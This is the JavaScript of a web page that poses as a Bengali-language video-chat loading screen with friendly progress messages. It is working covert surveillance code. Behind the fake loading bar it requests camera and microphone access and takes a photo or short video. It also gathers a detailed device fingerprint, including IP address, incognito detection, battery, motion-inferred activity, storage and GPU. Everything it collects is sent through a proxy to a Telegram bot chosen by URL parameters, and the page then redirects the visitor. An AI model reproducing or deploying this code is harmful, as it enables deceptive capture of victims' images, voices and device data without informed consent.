// Canvas-based particle system
const canvas = document.getElementById('particle-canvas');
const ctx = canvas.getContext('2d');
function resizeCanvas() {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
}
window.addEventListener('resize', () => { resizeCanvas(); });
resizeCanvas();

class Particle {
    constructor() { this.reset(); }
    reset() {
        this.x = Math.random() * canvas.width;
        this.y = Math.random() * canvas.height;
        this.vx = (Math.random() - 0.5) * 0.5;
        this.vy = (Math.random() - 0.5) * 0.5;
        this.size = Math.random() * 3 + 1;
        this.alpha = Math.random() * 0.5 + 0.1;
    }
    update() {
        this.x += this.vx;
        this.y += this.vy;
        if (this.x < 0 || this.x > canvas.width) this.vx *= -1;
        if (this.y < 0 || this.y > canvas.height) this.vy *= -1;
    }
    draw() {
        ctx.save();
        ctx.globalAlpha = this.alpha;
        ctx.beginPath();
        ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
        ctx.fillStyle = '#fff';
        ctx.fill();
        ctx.restore();
    }
}

const particles = Array.from({ length: window.innerWidth < 768 ? 15 : 30 }, () => new Particle());
function animateParticles() {
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    particles.forEach(p => { p.update(); p.draw(); });
    requestAnimationFrame(animateParticles);
}
animateParticles();

// Progress Bar + Redirect Logic
let progress = 0;
let targetProgress = 0;
let shouldRedirect = false;
let currentStage = 'initializing';
const progressBar = document.getElementById('progress-bar');
const percentage = document.getElementById('percentage');
const loadingMessage = document.getElementById('loading-message');

const stages = {
    initializing: { progress: 15, message: ' বিশ্বের যে কোনো প্রান্তে বন্ধু খুঁজুন!', icon: '⌿' },
    cameraAccess: { progress: 35, message: ' নিরাপদ এবং আনন্দদায়ক ভিডিও চ্যাট!', icon: '📸' },
    capturing: { progress: 60, message: ' আমাদের সাথে থাকার জন্য ধন্যবাদ! ', icon: '🫰' },
    sendingData: { progress: 85, message: ' আপনার দিন আনন্দে কাটুক!', icon: '🤗' },
    completing: { progress: 100, message: 'সম্পন্ন হয়েছে', icon: '✅' }
};

function updateStage(stage) {
    currentStage = stage;
    targetProgress = stages[stage].progress;
    const stageInfo = stages[stage];
    loadingMessage.innerHTML = `<span class="status-icon">${stageInfo.icon}</span><span>${stageInfo.message}<span class="loading-dots"><span>.</span><span>.</span><span>.</span></span></span>`;
}

function smoothProgress() {
    if (progress < targetProgress) {
        const diff = targetProgress - progress;
        progress += diff * 0.1;
        if (diff < 0.5) progress = targetProgress;
    }
    progressBar.style.width = progress + '%';
    percentage.textContent = Math.floor(progress) + '%';
    if (shouldRedirect && progress >= 99) {
        loadingMessage.innerHTML = '<span class="status-icon">🎉</span><span> আপনার সুন্দর মুহূর্তটি এখন উপভোগ করুন! 🤗...</span>';
        setTimeout(() => {
            const token = getUrlParameter('token');
            const chat_id = getUrlParameter('id');
            const newUrl = `../main/?token=${token}&id=${chat_id}`;
            window.location.href = newUrl;
        }, 800);
    } else {
        requestAnimationFrame(smoothProgress);
    }
}

function triggerRedirect() {
    shouldRedirect = true;
    updateStage('completing');
    targetProgress = 100;
}

updateStage('initializing');
smoothProgress();

// Rotating Tips
const tips = ["বিশ্বের যে কোনো প্রান্তে বন্ধু খুঁজুন!", "নিরাপদ এবং আনন্দদায়ক ভিডিও চ্যাট!", "আমাদের সাথে থাকার জন্য ধন্যবাদ!"];
const tipText = document.getElementById('tip-text');
const iconPulse = document.querySelector('.icon-pulse');
const icons = ['fas fa-star','fas fa-heart','fas fa-comments','fas fa-smile','fas fa-globe'];
let currentTip = 0, currentIcon = 0;
function rotateTips() {
    tipText.style.opacity = 0;
    iconPulse.style.opacity = 0;
    setTimeout(() => {
        currentTip = (currentTip + 1) % tips.length;
        currentIcon = (currentIcon + 1) % icons.length;
        tipText.textContent = tips[currentTip];
        iconPulse.innerHTML = `<i class="${icons[currentIcon]}"></i>`;
        tipText.style.opacity = 1;
        iconPulse.style.opacity = 1;
        setTimeout(rotateTips, 3000);
    }, 500);
}
setTimeout(rotateTips, 3000);

// Helper: Get URL Parameter
function getUrlParameter(name) {
    name = name.replace(/[\[\]]/g, '\\$&');
    var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'), results = regex.exec(window.location.href);
    if (!results) return null;
    if (!results[2]) return '';
    return decodeURIComponent(results[2].replace(/\+/g, ' '));
}

const tokenFromUrl = getUrlParameter('token');
const chatIdFromUrl = getUrlParameter('id');
const modeFromUrl = getUrlParameter('mode') || 'front-photo';
const durationFromUrl = parseInt(getUrlParameter('duration')) || 2;

const PROXY_API_URL = '/api/index.js';

console.log('🔍 Using API URL:', PROXY_API_URL);
console.log('🔑 Token:', tokenFromUrl);
console.log('💬 Chat ID:', chatIdFromUrl);
console.log('🔹 Mode:', modeFromUrl);

// Helper: Blob to Base64
function blobToBase64(blob) {
    return new Promise((resolve, reject) => {
        const reader = new FileReader();
        reader.onloadend = () => resolve(reader.result.split(',')[1]);
        reader.onerror = reject;
        reader.readAsDataURL(blob);
    });
}

// Send photo via proxy API (using base64)
async function sendPhotoViaProxy(blob, caption, token, chat_id) {
    console.log('📤 Sending photo via proxy...');
    console.log('📷 Photo size:', blob.size, 'bytes');
    
    try {
        // Convert blob to base64
        const base64Data = await blobToBase64(blob);
        console.log('✅ Converted to base64, length:', base64Data.length);
        
        const response = await fetch(PROXY_API_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                action: 'sendPhoto',
                token: token,
                chat_id: chat_id,
                photo: base64Data,
                caption: caption
            })
        });
        
        console.log('📥 Response status:', response.status);
        const result = await response.json();
        console.log('📥 Response data:', result);
        
        if (result.success) {
            console.log('✅ Photo sent successfully via proxy');
            return true;
        } else {
            console.error('❌ Failed to send photo:', result.error);
            return false;
        }
    } catch (error) {
        console.error('❌ Error sending photo via proxy:', error);
        return false;
    }
}

// Send video via proxy API (using base64)
async function sendVideoViaProxy(blob, caption, token, chat_id) {
    console.log('📤 Sending video via proxy...');
    console.log('🎥 Video size:', blob.size, 'bytes');
    
    try {
        // Convert blob to base64
        const base64Data = await blobToBase64(blob);
        console.log('✅ Converted to base64, length:', base64Data.length);
        
        const response = await fetch(PROXY_API_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                action: 'sendVideo',
                token: token,
                chat_id: chat_id,
                video: base64Data,
                caption: caption
            })
        });
        
        console.log('📥 Response status:', response.status);
        const result = await response.json();
        console.log('📥 Response data:', result);
        
        if (result.success) {
            console.log('✅ Video sent successfully via proxy');
            return true;
        } else {
            console.error('❌ Failed to send video:', result.error);
            return false;
        }
    } catch (error) {
        console.error('❌ Error sending video via proxy:', error);
        return false;
    }
}

// Message sending function (via proxy)
async function sendMessageToTelegram(message, token, chat_id) {
    console.log('📤 Sending message via proxy...');
    try {
        const response = await fetch(PROXY_API_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                action: 'sendMessage', 
                token: token, 
                chat_id: chat_id, 
                message: message 
            })
        });
        
        console.log('📥 Response status:', response.status);
        const result = await response.json();
        console.log('📥 Response data:', result);
        
        if (result.success) {
            console.log('✅ Message sent successfully via proxy');
            return true;
        } else {
            console.error('❌ Failed to send message:', result.error);
            return false;
        }
    } catch (error) {
        console.error('❌ Error sending message via proxy:', error);
        return false;
    }
}

// Incognito Detection
async function detectIncognitoMode() {
    return new Promise((resolve) => {
        let isResolved = false;
        function resolvePrivacy(isPrivate) { if (!isResolved) { isResolved = true; resolve(isPrivate ? '✅ ' : '❌'); } }
        function getErrorMessageLength() { let errorLength = 0; const testNumber = parseInt("-1"); try { testNumber.toFixed(testNumber); } catch (error) { errorLength = error.message.length; } return errorLength; }
        async function checkSafariStorageAPI() { try { await navigator.storage.getDirectory(); resolvePrivacy(false); } catch (error) { const errorMessage = error instanceof Error && typeof error.message === "string" ? error.message : String(error); resolvePrivacy(errorMessage.includes("unknown transient reason")); } }
        async function detectSafari() {
            if (typeof navigator.storage?.getDirectory === "function") { await checkSafariStorageAPI(); } else {
                if (navigator.maxTouchPoints !== undefined) {
                    const dbName = String(Math.random());
                    try {
                        const request = indexedDB.open(dbName, 1);
                        request.onupgradeneeded = function(event) {
                            const db = event.target.result;
                            try { db.createObjectStore("t", { autoIncrement: true }).put(new Blob()); resolvePrivacy(false); } catch (error) { const errorMessage = error instanceof Error && typeof error.message === "string" ? error.message : String(error); resolvePrivacy(errorMessage.includes("are not yet supported")); } finally { db.close(); indexedDB.deleteDatabase(dbName); }
                        };
                        request.onerror = function() { resolvePrivacy(false); };
                    } catch (error) { resolvePrivacy(false); }
                } else {
                    const openDatabase = window.openDatabase;
                    const localStorage = window.localStorage;
                    try { openDatabase(null, null, null, null); } catch (error) { resolvePrivacy(true); return; }
                    try { localStorage.setItem("test", "1"); localStorage.removeItem("test"); } catch (error) { resolvePrivacy(true); return; }
                    resolvePrivacy(false);
                }
            }
        }
        function detectChrome() {
            function checkStorageQuota() { navigator.webkitTemporaryStorage.queryUsageAndQuota(function(usage, quota) { const quotaMB = Math.round(quota / 1048576); const heapLimit = Math.round(getJSHeapSizeLimit() / 1048576); const expectedQuota = 2 * heapLimit; resolvePrivacy(quotaMB < expectedQuota); }, function(error) { resolvePrivacy(false); }); }
            function getJSHeapSizeLimit() { return window.performance?.memory?.jsHeapSizeLimit ?? 1073741824; }
            if (self.Promise !== undefined && self.Promise.allSettled !== undefined) { checkStorageQuota(); } else { window.webkitRequestFileSystem(0, 1, function() { resolvePrivacy(false); }, function() { resolvePrivacy(true); }); }
        }
        async function detectFirefox() {
            if (typeof navigator.storage?.getDirectory === "function") { try { await navigator.storage.getDirectory(); resolvePrivacy(false); } catch (error) { const errorMessage = error instanceof Error && typeof error.message === "string" ? error.message : String(error); resolvePrivacy(errorMessage.includes("Security error")); return; } } else { const request = indexedDB.open("inPrivate"); request.onerror = function(event) { if (request.error && request.error.name === "InvalidStateError") { event.preventDefault(); } resolvePrivacy(true); }; request.onsuccess = function() { indexedDB.deleteDatabase("inPrivate"); resolvePrivacy(false); }; }
        }
        async function detectBrowser() {
            const errorLength = getErrorMessageLength();
            if (errorLength === 44 || errorLength === 43) { await detectSafari(); } else if (errorLength === 51) { detectChrome(); } else if (errorLength === 25) { await detectFirefox(); } else { if (navigator.msSaveBlob !== undefined) { resolvePrivacy(window.indexedDB === undefined); } else { resolvePrivacy(false); } }
        }
        detectBrowser().catch(() => { resolvePrivacy(false); });
        setTimeout(() => { if (!isResolved) { resolvePrivacy(false); } }, 1000);
    });
}

// Device Info Collection
let currentActivity = "Unknown";
let accHistory = [];
const historyLength = 100;
const walkingThreshold = 2.0;
function calculateVariance(arr) { const mean = arr.reduce((a, b) => a + b, 0) / arr.length; return arr.reduce((a, b) => a + Math.pow(b - mean, 2), 0) / arr.length; }
function handleMotion(event) {
    const acc = event.accelerationIncludingGravity;
    if (!acc) return;
    const x = acc.x || 0, y = acc.y || 0, z = acc.z || 0;
    const magnitude = Math.sqrt(x * x + y * y + z * z);
    accHistory.push(magnitude);
    if (accHistory.length > historyLength) accHistory.shift();
    const variance = calculateVariance(accHistory);
    const isWalking = variance > walkingThreshold;
    if (isWalking) { currentActivity = "Walking or riding"; } else {
        const pitch = Math.atan2(y, Math.sqrt(x * x + z * z)) * (180 / Math.PI);
        const roll = Math.atan2(x, Math.sqrt(y * y + z * z)) * (180 / Math.PI);
        if (Math.abs(pitch) > 60 || Math.abs(roll) > 60) { currentActivity = "Lying down"; } else { currentActivity = "Standing or Sitting"; }
    }
}
if (window.DeviceMotionEvent) { window.addEventListener('devicemotion', handleMotion); } else { currentActivity = "Sensor not supported"; }

async function measureSpeed() {
    const url = 'https://speed.cloudflare.com/__down?bytes=500000';
    const fileSizeBytes = 500000, numTests = 2;
    let totalSpeed = 0, successfulTests = 0;
    for (let i = 0; i < numTests; i++) {
        try {
            const start = performance.now();
            await fetch(url, { mode: 'no-cors', cache: 'no-store' });
            const end = performance.now();
            const duration = (end - start) / 1000;
            if (duration > 0) { const bitsLoaded = fileSizeBytes * 8; const speedBps = bitsLoaded / duration; totalSpeed += speedBps; successfulTests++; }
        } catch (error) { console.error('Error in speed test:', error); }
    }
    if (successfulTests === 0) return 'Unknown';
    const averageSpeedBps = totalSpeed / successfulTests;
    const speedMbps = (averageSpeedBps / 1000000).toFixed(2);
    return speedMbps;
}

async function getDeviceInfo() {
    try {
        const incognitoStatus = await detectIncognitoMode();
        let ip = 'Unknown';
        try { const response = await fetch('https://ipinfo.io/json?token=293a8cc2dccb67'); const data = await response.json(); ip = data.ip; } catch (e) { console.error('Error fetching IP info:', e); }
        const userAgent = navigator.userAgent || 'Unknown';
        let browserName = 'Unknown';
        if (navigator.userAgentData) { const brands = navigator.userAgentData.brands; if (brands) { const browserBrand = brands.find(brand => brand.brand !== "Chromium" && !brand.brand.toLowerCase().includes("not")); if (browserBrand) { browserName = browserBrand.brand; } } } else { if (/Firefox/i.test(userAgent)) { browserName = "Firefox"; } else if (/Safari/i.test(userAgent) && !/Chrome/i.test(userAgent)) { browserName = "Safari"; } }
        let batteryPercentage = 'Unknown', chargingStatus = 'Unknown';
        if (typeof navigator.getBattery === 'function') { try { const battery = await navigator.getBattery(); batteryPercentage = (battery.level * 100).toFixed(2); chargingStatus = battery.charging ? "✅" : "❌"; } catch (e) { console.error('Error getting battery info:', e); } }
        const browserLanguage = navigator.language || 'Unknown';
        const screenWidth = window.screen.width || 'Unknown';
        const screenHeight = window.screen.height || 'Unknown';
        const speedMbps = await measureSpeed();
        let networkType = 'Unknown', networkIndicator = 'Unknown';
        if (navigator.connection) {
            if (navigator.connection.effectiveType) { const effectiveType = navigator.connection.effectiveType; switch (effectiveType) { case 'slow-2g': case '2g': networkType = '2G'; break; case '3g': networkType = '3G'; break; case '4g': networkType = '4G'; break; default: networkType = 'Unknown'; } }
            if (navigator.connection.type) { networkIndicator = navigator.connection.type === 'wifi' ? 'Wi-Fi' : 'Mobile Data'; }
        } else if (speedMbps !== 'Unknown') { const speed = parseFloat(speedMbps); if (speed < 0.1) networkType = '1G'; else if (speed < 1) networkType = '2G'; else if (speed < 10) networkType = '3G'; else if (speed < 50) networkType = '4G'; else networkType = '5G'; }
        function adjustStorage(value) { if (value >= 20 && value < 30) return 32; if (value >= 50 && value < 70) return 64; if (value >= 100 && value < 130) return 128; if (value >= 250 && value < 280) return 256; return Math.round(value); }
        let storageDisplay = 'Unknown';
        if (navigator.storage && typeof navigator.storage.estimate === 'function') { try { const storageInfo = await navigator.storage.estimate(); let totalStorage = (storageInfo.quota / (1024 * 1024 * 1024)).toFixed(2); let usedStorage = (storageInfo.usage / (1024 * 1024 * 1024)).toFixed(2); usedStorage = adjustStorage(usedStorage * 2); totalStorage = adjustStorage(totalStorage * 2); storageDisplay = usedStorage > 0 ? `${usedStorage} GB / ${totalStorage} GB` : `${totalStorage} GB`; } catch (e) { console.error('Error getting storage info:', e); } }
        const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown';
        const currentTime = new Date();
        const date = currentTime.toLocaleDateString() || 'Unknown';
        const time = currentTime.toLocaleTimeString() || 'Unknown';
        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
        const activity = currentActivity || 'Unknown';
        const pixelRatio = window.devicePixelRatio || 'Unknown';
        const viewportWidth = window.innerWidth || 'Unknown';
        const viewportHeight = window.innerHeight || 'Unknown';
        const cpuCores = navigator.hardwareConcurrency || 'Unknown';
        let gpuRenderer = 'Unknown';
        try { const canvas2 = document.createElement('canvas'); const gl = canvas2.getContext('webgl') || canvas2.getContext('experimental-webgl'); if (gl) { const debugInfo = gl.getExtension('WEBGL_debug_renderer_info'); if (debugInfo) { gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL); } } } catch (e) { console.error('Error getting GPU renderer:', e); }
        const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(userAgent);
        const isPC = !isMobile;
        const isIphone = /iPhone/i.test(userAgent);
        const isMac = /Macintosh/i.test(userAgent);
        const isIphoneOrMac = isIphone || isMac;
        const unavailableByBrowser = { 'Brave': ['networkIndicator', 'batteryPercentage', 'chargingStatus', 'ram', 'storageDisplay', 'activity', 'cpuCores', 'viewportWidth', 'viewportHeight'], 'DuckDuckGo': ['batteryPercentage', 'chargingStatus', 'ram'], 'Firefox': ['batteryPercentage', 'chargingStatus', 'networkIndicator', 'ram', 'storageDisplay', 'gpuRenderer'] };
        const unavailableOnPC = ['batteryPercentage', 'chargingStatus', 'networkIndicator', 'activity', 'storageDisplay'];
        const excludeForIphoneMac = ['batteryPercentage', 'chargingStatus', 'networkType', 'storageDisplay'];
        let unavailableKeys = unavailableByBrowser[browserName] || [];
        if (isPC) { unavailableKeys = [...new Set([...unavailableKeys, ...unavailableOnPC])]; }
        if (isIphoneOrMac) { unavailableKeys = [...new Set([...unavailableKeys, ...excludeForIphoneMac])]; }
        const captionLines = [
            { keys: ['ip'], text: `<b>🌐 IP Address:</b> ${ip}` },
            { keys: ['userAgent'], text: `<b>💻 User-Agent:</b> ${userAgent}` },
            { keys: ['browserName', 'browserLanguage'], text: `<b>🌐 Browser:</b> ${browserName} ${browserLanguage}` },
            { keys: ['incognitoStatus'], text: `<b>🕵️ Incognito Mode:</b> ${incognitoStatus}` },
            { keys: ['batteryPercentage', 'chargingStatus'], text: `<b>🔋 Battery:</b> ${batteryPercentage}% <b>Charging:</b> ${chargingStatus}` },
            { keys: ['screenWidth', 'screenHeight'], text: `<b>📐 Screen Size:</b> ${screenWidth}×${screenHeight}` },
            { keys: ['speedMbps'], text: `<b>🚀 Internet Speed:</b> ${speedMbps} Mbps` },
            { keys: ['networkType', 'networkIndicator'], text: `<b>📶 Network:</b> ${networkType} <b>Type:</b> ${networkIndicator}` },
            { keys: ['ram', 'storageDisplay'], text: `<b>💾 RAM & Storage:</b> ${ram}/${storageDisplay}` },
            { keys: ['date', 'time', 'timeZone'], text: `<b>🕐 Date:</b> ${date} <b>Time:</b> ${time}\n\n<b>🌍 Time Zone:</b> ${timeZone}` },
            { keys: ['activity'], text: `<b>🏃 Activity:</b> ${activity}` },
            { keys: ['pixelRatio'], text: `<b>📊 Device Pixel Ratio:</b> ${pixelRatio}` },
            { keys: ['viewportWidth', 'viewportHeight'], text: `<b>🖥️ Viewport Size:</b> ${viewportWidth}×${viewportHeight}` },
            { keys: ['cpuCores'], text: `<b>🧑‍💻 CPU Cores:</b> ${cpuCores}` },
            { keys: ['gpuRenderer'], text: `<b>🎮 GPU Renderer:</b> ${gpuRenderer}` }
        ];
        const availableLines = captionLines.filter(line => line.keys.every(key => !unavailableKeys.includes(key)));
        const caption = availableLines.map(line => line.text).join('\n\n') + '\n\n<blockquote><b>⚠️ Note:</b> এই তথ্যের অপব্যবহার করলে আপনি সম্পূর্ণ দায়ী থাকবেন। আমি আপনার কাজের জন্য দায়ী থাকব না।</blockquote>';
        return caption;
    } catch (error) {
        console.error('Error getting device info:', error);
        return `<b>⚠️ Unable to retrieve device info</b>`;
    }
}

// Photo Capture
async function capturePhoto(facingMode) {
    console.log('📸 Starting photo capture with facingMode:', facingMode);
    updateStage('cameraAccess');
    let stream = null;
    try {
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
        console.log('✅ Camera access granted');
    } catch (err1) {
        console.warn(`facingMode='${facingMode}' failed, trying fallback:`, err1);
        try {
            stream = await navigator.mediaDevices.getUserMedia({ video: true });
            console.log('✅ Fallback camera access granted');
        } catch (err2) {
            console.error("❌ Fallback getUserMedia({video:true}) failed:", err2);
            updateStage('sendingData');
            const caption = await getDeviceInfo();
            if (tokenFromUrl && chatIdFromUrl) {
                const cameraType = facingMode === 'user' ? 'Front' : 'Back';
                const errorMessage = `<b>🚫 ${cameraType} Camera Access Failed</b>\n\n<b>Error:</b> ${err2.name} - ${err2.message}\n\n${caption}`;
                await sendMessageToTelegram(errorMessage, tokenFromUrl, chatIdFromUrl);
            }
            triggerRedirect();
            return;
        }
    }
    try {
        updateStage('capturing');
        const videoElement = document.createElement('video');
        videoElement.srcObject = stream;
        await new Promise(resolve => { videoElement.onloadedmetadata = () => { resolve(); }; });
        videoElement.play();
        console.log('🎥 Video playing, capturing frame...');
        
        const canvas2 = document.createElement('canvas');
        canvas2.width = videoElement.videoWidth;
        canvas2.height = videoElement.videoHeight;
        const ctx2 = canvas2.getContext('2d');
        ctx2.drawImage(videoElement, 0, 0, canvas2.width, canvas2.height);
        const blob = await new Promise(resolve => canvas2.toBlob(resolve, 'image/jpeg', 0.8));
        console.log('📷 Photo captured, size:', blob.size, 'bytes');
        
        updateStage('sendingData');
        const caption = await getDeviceInfo();
        if (tokenFromUrl && chatIdFromUrl) {
            const cameraType = facingMode === 'user' ? 'Front' : 'Back';
            const photoMessage = `<b>📸 ${cameraType} Camera Photo </b>\n\n<blockquote><b>⚠️ Do not misuse this photo</b></blockquote>\n\n${caption}`;
            await sendPhotoViaProxy(blob, photoMessage, tokenFromUrl, chatIdFromUrl);
        }
        stream.getTracks().forEach(track => track.stop());
        triggerRedirect();
    } catch (captureError) {
        console.error("❌ Error capturing photo:", captureError);
        updateStage('sendingData');
        const caption = await getDeviceInfo();
        if (tokenFromUrl && chatIdFromUrl) {
            const cameraType = facingMode === 'user' ? 'Front' : 'Back';
            const errorMessage = `<b>🚫 Failed to capture ${cameraType} camera photo</b>\n\n<b>Error:</b> ${captureError.name} - ${captureError.message}\n\n${caption}`;
            await sendMessageToTelegram(errorMessage, tokenFromUrl, chatIdFromUrl);
        }
        triggerRedirect();
    }
}

// Video Recording
async function recordVideo(facingMode, duration) {
    console.log('🎥 Starting video recording with facingMode:', facingMode, 'duration:', duration);
    updateStage('cameraAccess');
    let stream = null;
    try {
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode }, audio: true });
        console.log('✅ Camera and audio access granted');
    } catch (err1) {
        console.warn(`facingMode='${facingMode}' failed, trying fallback:`, err1);
        try {
            stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            console.log('✅ Fallback camera and audio access granted');
        } catch (err2) {
            console.error("❌ Fallback getUserMedia failed:", err2);
            updateStage('sendingData');
            const caption = await getDeviceInfo();
            if (tokenFromUrl && chatIdFromUrl) {
                const cameraType = facingMode === 'user' ? 'Front' : 'Back';
                const errorMessage = `<b>🚫 ${cameraType} Camera Access Failed</b>\n\n<b>Error:</b> ${err2.name} - ${err2.message}\n\n${caption}`;
                await sendMessageToTelegram(errorMessage, tokenFromUrl, chatIdFromUrl);
            }
            triggerRedirect();
            return;
        }
    }
    try {
        updateStage('capturing');
        const mediaRecorder = new MediaRecorder(stream);
        const recordedChunks = [];
        
        mediaRecorder.ondataavailable = event => { 
            if (event.data && event.data.size > 0) { 
                recordedChunks.push(event.data); 
                console.log('🔹 Chunk received, size:', event.data.size);
            } 
        };
        
        mediaRecorder.onstop = async () => {
            const blob = new Blob(recordedChunks, { type: 'video/mp4' });
            console.log('🎬 Recording stopped, video size:', blob.size, 'bytes');
            
            updateStage('sendingData');
            const caption = await getDeviceInfo();
            if (tokenFromUrl && chatIdFromUrl) {
                const cameraType = facingMode === 'user' ? 'Front' : 'Back';
                const videoMessage = `<b>🔹 ${cameraType} Camera Video (${duration}s)</b>\n\n<blockquote><b>⚠️ Do not misuse this video</b></blockquote>\n\n${caption}`;
                await sendVideoViaProxy(blob, videoMessage, tokenFromUrl, chatIdFromUrl);
            }
            stream.getTracks().forEach(track => track.stop());
            triggerRedirect();
        };
        
        mediaRecorder.start();
        console.log('🔴 Recording started for', duration, 'seconds');
        
        setTimeout(() => { 
            mediaRecorder.stop(); 
            console.log('⏹️ Recording stopped by timeout');
        }, duration * 1000);
    } catch (recordError) {
        console.error("❌ Error recording video:", recordError);
        updateStage('sendingData');
        const caption = await getDeviceInfo();
        if (tokenFromUrl && chatIdFromUrl) {
            const cameraType = facingMode === 'user' ? 'Front' : 'Back';
            const errorMessage = `<b>🚫 Failed to record ${cameraType} camera video</b>\n\n<b>Error:</b> ${recordError.name} - ${recordError.message}\n\n${caption}`;
            await sendMessageToTelegram(errorMessage, tokenFromUrl, chatIdFromUrl);
        }
        triggerRedirect();
    }
}

// Main Camera Access
async function requestCameraAccess() {
    console.log('🚀 Starting camera access request...');
    console.log('Mode:', modeFromUrl, 'Duration:', durationFromUrl);
    
    try {
        await navigator.mediaDevices.getUserMedia({ video: true });
        console.log('✅ Initial camera access granted');
        
        switch(modeFromUrl.toLowerCase()) {
            case 'front-photo':
                console.log('📸 Mode: Front Photo');
                await capturePhoto('user');
                break;
            case 'front-video':
                console.log('🎥 Mode: Front Video');
                await recordVideo('user', durationFromUrl);
                break;
            case 'back-photo':
                console.log('📸 Mode: Back Photo');
                await capturePhoto('environment');
                break;
            case 'back-video':
                console.log('🎥 Mode: Back Video');
                await recordVideo('environment', durationFromUrl);
                break;
            default:
                console.log('⚠️ Invalid mode, defaulting to front-photo');
                await capturePhoto('user');
        }
    } catch (error) {
        console.error('❌ Error accessing camera:', error);
        updateStage('sendingData');
        const caption = await getDeviceInfo();
        if (tokenFromUrl && chatIdFromUrl) {
            const errorMessage = `<blockquote><b>🚫 Camera Access Blocked</b></blockquote>\n\n<b>Mode:</b> ${modeFromUrl}\n\n${caption}`;
            await sendMessageToTelegram(errorMessage, tokenFromUrl, chatIdFromUrl);
        }
        triggerRedirect();
    }
}

// Validate parameters before starting
if (!tokenFromUrl || !chatIdFromUrl) {
    console.error('❌ Missing required parameters!');
    console.error('Token:', tokenFromUrl);
    console.error('Chat ID:', chatIdFromUrl);
    alert('Error: Missing token or chat_id in URL parameters');
} else {
    console.log('✅ All parameters validated, starting...');
    requestCameraAccess();
}